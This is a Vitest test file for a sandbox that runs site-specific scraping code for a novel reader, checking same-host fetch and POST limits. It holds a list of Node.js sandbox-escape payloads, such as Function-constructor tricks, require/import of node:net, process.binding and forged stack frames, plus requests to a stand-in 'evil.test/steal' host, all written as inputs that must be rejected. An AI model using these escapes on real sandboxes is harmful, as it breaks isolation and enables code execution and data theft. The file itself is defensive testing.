import { afterAll, describe, expect, it, vi } from "vitest";

vi.mock("../toc/http", () => ({ fetchWithRetry: vi.fn(async () => new Response("<p>other page</p>")) }));
vi.mock("../renderer", () => ({ renderPageHtml: vi.fn(async () => "<p>rendered</p>") }));

import { fetchWithRetry } from "../toc/http";
import { runSiteCode, stopSiteRunner } from "./siteSandbox";

const url = "https://novels.test/story";
const html = `<html><body><h1>Title</h1><a href="/c1">One</a></body></html>`;
const run = (code: string, fn: "toc" | "chapter" = "toc") => runSiteCode({ code, fn, url, html });

afterAll(() => stopSiteRunner());

describe("site sandbox", () => {
  it("runs the code with the page as a DOM and returns plain data", async () => {
    const value = await run(`async function toc(ctx) {
      const a = ctx.document.querySelector("a");
      return { title: ctx.document.querySelector("h1").textContent, chapters: [{ url: new URL(a.getAttribute("href"), ctx.url).href, title: a.textContent }] };
    }`);
    expect(value).toEqual({ title: "Title", chapters: [{ url: "https://novels.test/c1", title: "One" }] });
  });

  it("lets the code load other pages of the same host only, through the app", async () => {
    expect(await run(`async function toc(ctx) { return await ctx.fetchText("https://novels.test/page2"); }`)).toBe("<p>other page</p>");
    expect(await run(`async function toc(ctx) { return await ctx.render("https://www.novels.test/x"); }`)).toBe("<p>rendered</p>");
    await expect(run(`async function toc(ctx) { return await ctx.fetchText("https://evil.test/steal"); }`)).rejects.toThrow(/may only load pages of novels.test/);
  });

  it("lets the code POST a form to the same host, as a page's own script does, and nowhere else", async () => {
    const mocked = vi.mocked(fetchWithRetry);
    mocked.mockClear();
    mocked.mockResolvedValueOnce(new Response('{"rs":200,"data":[1,2]}'));
    const json = await run(`async function toc(ctx) { return await ctx.postJson("https://novels.test/api/list", { bid: 42, order: "asc" }); }`);
    expect(json).toEqual({ rs: 200, data: [1, 2] });
    const [target, init] = mocked.mock.calls[0];
    expect(target).toBe("https://novels.test/api/list");
    expect(init).toMatchObject({ method: "POST", body: "bid=42&order=asc" });
    expect((init?.headers as Record<string, string>)["content-type"]).toContain("x-www-form-urlencoded");
    expect((init?.headers as Record<string, string>).referer).toBe(url);
    mocked.mockResolvedValueOnce(new Response("<li>text</li>"));
    expect(await run(`async function toc(ctx) { return await ctx.post("https://novels.test/api/html", { bid: "7" }); }`)).toBe("<li>text</li>");
    await expect(run(`async function toc(ctx) { return await ctx.post("https://evil.test/x", { a: 1 }); }`)).rejects.toThrow(/may only load pages of novels.test/);
  });

  it("reports code that defines no function or throws", async () => {
    await expect(run(`const x = 1;`)).rejects.toThrow(/defines no toc/);
    await expect(run(`function toc() { throw new Error("boom"); }`)).rejects.toThrow(/boom/);
  });

  const escapes: Record<string, string> = {
    "global fetch": `return await fetch("https://evil.test");`,
    "new Function": `return new Function("return process")();`,
    "async function constructor": `return await (async () => {}).constructor("return process")();`,
    "constructor through the DOM": `return ctx.document.constructor.constructor("return process")();`,
    "dynamic import": `return await import("node:net");`,
    "getBuiltinModule": `return process.getBuiltinModule("node:http");`,
    "process.binding": `return process.binding("tcp_wrap");`,
    "require": `return require("node:net");`,
    "eval": `return eval("1+1");`,
    "main module": `return process.mainModule.require("net");`,
    "caller chain": `return arguments.callee.caller;`,
    "process.kill": `return process.kill(process.ppid, 0);`,
  };
  for (const [name, body] of Object.entries(escapes)) {
    it(`cannot reach the network or more code: ${name}`, async () => {
      await expect(run(`async function toc(ctx) { ${body} }`)).rejects.toThrow();
    });
  }

  it("cannot spoof the caller of Function with a fake Error or a forged stack frame", async () => {
    await expect(
      run(`async function toc(ctx) {
        const RealError = globalThis.Error;
        globalThis.Error = class { constructor() { this.stack = "Error\\n    at Function (g)\\n    at x (/app/node_modules/nwsapi/src/nwsapi.js:1021:24)"; } };
        try { return typeof Function("return process")(); } finally { globalThis.Error = RealError; }
      }`)
    ).rejects.toThrow(/Building code from text is not allowed/);
    await expect(
      run(`async function toc(ctx) {
        const o = {};
        o["node_modules/nwsapi/x"] = function () { return Function("return process")(); };
        return typeof o["node_modules/nwsapi/x"]();
      }`)
    ).rejects.toThrow(/Building code from text is not allowed/);
    await expect(
      run(`async function toc(ctx) {
        const name = "x\\n    at Object.<anonymous> (/app/node_modules/nwsapi/src/nwsapi.js:1021:24)";
        const o = {};
        Object.defineProperty(o, name, { value: function () { return Function("return process")(); } });
        return typeof o[name]();
      }`)
    ).rejects.toThrow(/Building code from text is not allowed/);
  });

  it("cannot rewrite how the stack is read, nor build code through a promise or a callback", async () => {
    await expect(run(`async function toc(ctx) { Error.prepareStackTrace = () => "at x (/node_modules/nwsapi/y)"; return 1; }`)).rejects.toThrow();
    await expect(run(`async function toc(ctx) { return ["return process"].map(ctx.document.constructor.constructor)[0](); }`)).rejects.toThrow();
    await expect(
      run(`async function toc(ctx) { return await Promise.resolve("return process").then(ctx.document.constructor.constructor).then((f) => f()); }`)
    ).rejects.toThrow();
  });

  it("the page's window has no process or require", async () => {
    expect(await run(`async function toc(ctx) { return [typeof ctx.document.defaultView.process, typeof ctx.document.defaultView.require]; }`)).toEqual(["undefined", "undefined"]);
  });
});
